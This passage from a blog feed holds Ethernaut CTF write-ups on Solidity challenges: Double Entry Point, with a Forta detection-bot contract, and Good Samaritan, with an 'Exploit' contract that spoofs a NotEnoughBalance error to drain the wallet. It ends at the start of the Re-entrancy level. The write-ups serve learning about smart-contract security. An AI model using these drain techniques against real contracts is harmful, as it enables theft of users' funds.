class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">DelegateERC20</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">delegateTransfer</span>(<span class="params">address to, uint256 value, address origSender</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IDetectionBot</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">handleTransaction</span>(<span class="params">address user, bytes calldata msgData</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IForta</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setDetectionBot</span>(<span class="params">address detectionBotAddress</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">address user, bytes calldata msgData</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">raiseAlert</span>(<span class="params">address user</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Forta</span> is <span class="title class_">IForta</span> &#123;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title class_">IDetectionBot</span>) public usersDetectionBots;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public botRaisedAlerts;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setDetectionBot</span>(<span class="params">address detectionBotAddress</span>) external override &#123;</span><br><span class="line">      usersDetectionBots[msg.<span class="property">sender</span>] = <span class="title class_">IDetectionBot</span>(detectionBotAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">address user, bytes calldata msgData</span>) external override &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">address</span>(usersDetectionBots[user]) == <span class="title function_">address</span>(<span class="number">0</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">try</span> usersDetectionBots[user].<span class="title function_">handleTransaction</span>(<span class="params">user, msgData</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">raiseAlert</span>(<span class="params">address user</span>) external override &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_">address</span>(usersDetectionBots[user]) != msg.<span class="property">sender</span>) <span class="keyword">return</span>;</span><br><span class="line">      botRaisedAlerts[msg.<span class="property">sender</span>] += <span class="number">1</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CryptoVault</span> &#123;</span><br><span class="line">    address public sweptTokensRecipient;</span><br><span class="line">    <span class="title class_">IERC20</span> public underlying;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address recipient</span>) &#123;</span><br><span class="line">        sweptTokensRecipient = recipient;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setUnderlying</span>(<span class="params">address latestToken</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(underlying) == <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Already set&quot;</span>);</span><br><span class="line">        underlying = <span class="title class_">IERC20</span>(latestToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sweepToken</span>(<span class="params">IERC20 token</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(token != underlying, <span class="string">&quot;Can&#x27;t transfer underlying token&quot;</span>);</span><br><span class="line">        token.<span class="title function_">transfer</span>(sweptTokensRecipient, token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">LegacyToken</span> is <span class="title class_">ERC20</span>(<span class="string">&quot;LegacyToken&quot;</span>, <span class="string">&quot;LGT&quot;</span>), <span class="title class_">Ownable</span> &#123;</span><br><span class="line">    <span class="title class_">DelegateERC20</span> public delegate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mint</span>(<span class="params">address to, uint256 amount</span>) public onlyOwner &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">delegateToNewContract</span>(<span class="params">DelegateERC20 newContract</span>) public onlyOwner &#123;</span><br><span class="line">        delegate = newContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) public override returns (bool) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">address</span>(delegate) == <span class="title function_">address</span>(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">transfer</span>(to, value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> delegate.<span class="title function_">delegateTransfer</span>(to, value, msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DoubleEntryPoint</span> is <span class="title class_">ERC20</span>(<span class="string">&quot;DoubleEntryPointToken&quot;</span>, <span class="string">&quot;DET&quot;</span>), <span class="title class_">DelegateERC20</span>, <span class="title class_">Ownable</span> &#123;</span><br><span class="line">    address public cryptoVault;</span><br><span class="line">    address public player;</span><br><span class="line">    address public delegatedFrom;</span><br><span class="line">    <span class="title class_">Forta</span> public forta;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address legacyToken, address vaultAddress, address fortaAddress, address playerAddress</span>) &#123;</span><br><span class="line">        delegatedFrom = legacyToken;</span><br><span class="line">        forta = <span class="title class_">Forta</span>(fortaAddress);</span><br><span class="line">        player = playerAddress;</span><br><span class="line">        cryptoVault = vaultAddress;</span><br><span class="line">        <span class="title function_">_mint</span>(cryptoVault, <span class="number">100</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyDelegateFrom</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == delegatedFrom, <span class="string">&quot;Not legacy contract&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">fortaNotify</span>(<span class="params"></span>) &#123;</span><br><span class="line">        address detectionBot = <span class="title function_">address</span>(forta.<span class="title function_">usersDetectionBots</span>(player));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Cache old number of bot alerts</span></span><br><span class="line">        uint256 previousValue = forta.<span class="title function_">botRaisedAlerts</span>(detectionBot);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Notify Forta</span></span><br><span class="line">        forta.<span class="title function_">notify</span>(player, msg.<span class="property">data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Continue execution</span></span><br><span class="line">        _;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check if alarms have been raised</span></span><br><span class="line">        <span class="keyword">if</span>(forta.<span class="title function_">botRaisedAlerts</span>(detectionBot) &gt; previousValue) <span class="title function_">revert</span>(<span class="string">&quot;Alert has been triggered, reverting&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">delegateTransfer</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address to,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        address origSender</span></span><br><span class="line"><span class="params">    </span>) public override onlyDelegateFrom fortaNotify returns (bool) &#123;</span><br><span class="line">        <span class="title function_">_transfer</span>(origSender, to, value);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To completet this challenge we need to implement a <code>detection</code> bot which notifies whenever a potential attack is going to be happen. here in this token <strong>if we try to sweep LegacyToken we are able to sweep DoubleEntryPointToken</strong>, so the we need to write a bot which tracks for the LegacyToken sweepâ€™s and notify to <code>Forta</code> contract, I have read a <a href="https://github.com/maAPPsDEV/double-entry-point-attack">blog</a> which explains how exactly to to track the transaction for the potential attack and got the script for the bot.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./DoubleEntryPoint.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DetectionBot</span> is <span class="title class_">IDetectionBot</span> &#123;</span><br><span class="line">  address private vault;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _vault</span>) public &#123;</span><br><span class="line">    vault = _vault;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* calldata layout</span></span><br><span class="line"><span class="comment">| calldata offset | length | element                                | type    | example value                                                      |</span></span><br><span class="line"><span class="comment">|-----------------|--------|----------------------------------------|---------|--------------------------------------------------------------------|</span></span><br><span class="line"><span class="comment">| 0x00            | 4      | function signature (handleTransaction) | bytes4  | 0x220ab6aa                                                         |</span></span><br><span class="line"><span class="comment">| 0x04            | 32     | user                                   | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |</span></span><br><span class="line"><span class="comment">| 0x24            | 32     | offset of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000040 |</span></span><br><span class="line"><span class="comment">| 0x44            | 32     | length of msgData                      | uint256 | 0x0000000000000000000000000000000000000000000000000000000000000064 |</span></span><br><span class="line"><span class="comment">| 0x64            | 4      | function signature (delegateTransfer)  | bytes4  | 0x9cd1a121                                                         |</span></span><br><span class="line"><span class="comment">| 0x68            | 32     | to                                     | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |</span></span><br><span class="line"><span class="comment">| 0x88            | 32     | value                                  | uint256 | 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 |</span></span><br><span class="line"><span class="comment">| 0xA8            | 32     | origSender                             | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |</span></span><br><span class="line"><span class="comment">| 0xC8            | 28     | padding                                | bytes   | 0x00000000000000000000000000000000000000000000000000000000         |</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleTransaction</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address user,</span></span><br><span class="line"><span class="params">    bytes calldata <span class="comment">/* msgData */</span></span></span><br><span class="line"><span class="params">  </span>) external override &#123;</span><br><span class="line">    address to;</span><br><span class="line">    uint256 value;</span><br><span class="line">    address origSender;</span><br><span class="line">    <span class="comment">// decode msgData params</span></span><br><span class="line">    assembly &#123;</span><br><span class="line">      to := <span class="title function_">calldataload</span>(<span class="number">0x68</span>)</span><br><span class="line">      value := <span class="title function_">calldataload</span>(<span class="number">0x88</span>)</span><br><span class="line">      origSender := <span class="title function_">calldataload</span>(<span class="number">0xa8</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (origSender == vault) &#123;</span><br><span class="line">      <span class="title class_">Forta</span>(msg.<span class="property">sender</span>).<span class="title function_">raiseAlert</span>(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="27-Good-Samaritan"><a href="#27-Good-Samaritan" class="headerlink" title="27 - Good Samaritan"></a>27 - Good Samaritan</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GoodSamaritan</span> &#123;</span><br><span class="line">    <span class="title class_">Wallet</span> public wallet;</span><br><span class="line">    <span class="title class_">Coin</span> public coin;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        wallet = <span class="keyword">new</span> <span class="title class_">Wallet</span>();</span><br><span class="line">        coin = <span class="keyword">new</span> <span class="title class_">Coin</span>(<span class="title function_">address</span>(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.<span class="title function_">setCoin</span>(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">requestDonation</span>(<span class="params"></span>) external <span class="title function_">returns</span>(<span class="params">bool enoughBalance</span>)&#123;</span><br><span class="line">        <span class="comment">// donate 10 coins to requester</span></span><br><span class="line">        <span class="keyword">try</span> wallet.<span class="title function_">donate10</span>(<span class="params">msg.sender</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (bytes memory err) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">keccak256</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;NotEnoughBalance()&quot;</span>)) == <span class="title function_">keccak256</span>(err)) &#123;</span><br><span class="line">                <span class="comment">// send the coins left</span></span><br><span class="line">                wallet.<span class="title function_">transferRemainder</span>(msg.<span class="property">sender</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Coin</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error <span class="title class_">InsufficientBalance</span>(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address wallet_</span>) &#123;</span><br><span class="line">        <span class="comment">// one million coins for Good Samaritan initially</span></span><br><span class="line">        balances[wallet_] = <span class="number">10</span>**<span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address dest_, uint256 amount_</span>) external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.<span class="property">sender</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transfer only occurs if balance is enough</span></span><br><span class="line">        <span class="keyword">if</span>(amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.<span class="property">sender</span>] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(dest_.<span class="title function_">isContract</span>()) &#123;</span><br><span class="line">                <span class="comment">// notify contract </span></span><br><span class="line">                <span class="title class_">INotifyable</span>(dest_).<span class="title function_">notify</span>(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            revert <span class="title class_">InsufficientBalance</span>(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Wallet</span> &#123;</span><br><span class="line">    <span class="comment">// The owner of the wallet instance</span></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Coin</span> public coin;</span><br><span class="line"></span><br><span class="line">    error <span class="title class_">OnlyOwner</span>();</span><br><span class="line">    error <span class="title class_">NotEnoughBalance</span>();</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.<span class="property">sender</span> != owner) &#123;</span><br><span class="line">            revert <span class="title class_">OnlyOwner</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">donate10</span>(<span class="params">address dest_</span>) external onlyOwner &#123;</span><br><span class="line">        <span class="comment">// check balance left</span></span><br><span class="line">        <span class="keyword">if</span> (coin.<span class="title function_">balances</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            revert <span class="title class_">NotEnoughBalance</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// donate 10 coins</span></span><br><span class="line">            coin.<span class="title function_">transfer</span>(dest_, <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferRemainder</span>(<span class="params">address dest_</span>) external onlyOwner &#123;</span><br><span class="line">        <span class="comment">// transfer balance left</span></span><br><span class="line">        coin.<span class="title function_">transfer</span>(dest_, coin.<span class="title function_">balances</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setCoin</span>(<span class="params">Coin coin_</span>) external onlyOwner &#123;</span><br><span class="line">        coin = coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">INotifyable</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We need to drain all the funds to complete this challenge. if we look at the <code>wallet</code> contract it has <code>donate10</code> function which checks if the balance of it is less than <code>10</code> and if yes it returns a <code>NotEnoughBalance()</code> error, else it transfers <code>10</code> coins to the given address. however since <code>NotEnoughBalance()</code> custom error is used only once and under a condition that the balance is less than <code>10</code>, the <code>GoodSmaritan</code> contract sends the remaining amount to the address using the walletâ€™s <code>transferRemainder</code> function assuming the transaction amount is always less than <code>10</code>. but the <code>Coin</code> contract do call a function called <code>notify()</code> if the given address is a contract after the transaction is successfull, so if send the same custom error <code>NotEnoughBalance()</code> then it does triger the check inside the <code>GoodSmaritan</code> contract making it to call <code>transferRemainder</code> function eventually sending all of itâ€™s funds to the given contract.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GoodSamaritan</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">requestDonation</span>(<span class="params"></span>) external <span class="title function_">returns</span>(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="title class_">INotifyable</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="title class_">GoodSamaritan</span> gs;</span><br><span class="line">    error <span class="title class_">NotEnoughBalance</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>)&#123;</span><br><span class="line">        gs = <span class="title class_">GoodSamaritan</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        gs.<span class="title function_">requestDonation</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">uint256 amount</span>) external&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount==<span class="number">10</span>)&#123;revert <span class="title class_">NotEnoughBalance</span>();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
            <tag> ethernaut </tag>
            
            <tag> ethereum </tag>
            
            <tag> solidity </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10-18 Ethernaut CTF</title>
      <link href="/2022/11/15/10-18-Ethernaut-CTF/"/>
      <url>/2022/11/15/10-18-Ethernaut-CTF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10 - Re-entrancy"></a>10 - Re-entrancy</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Reentrance</span> &#123;</span><br><span class="line">  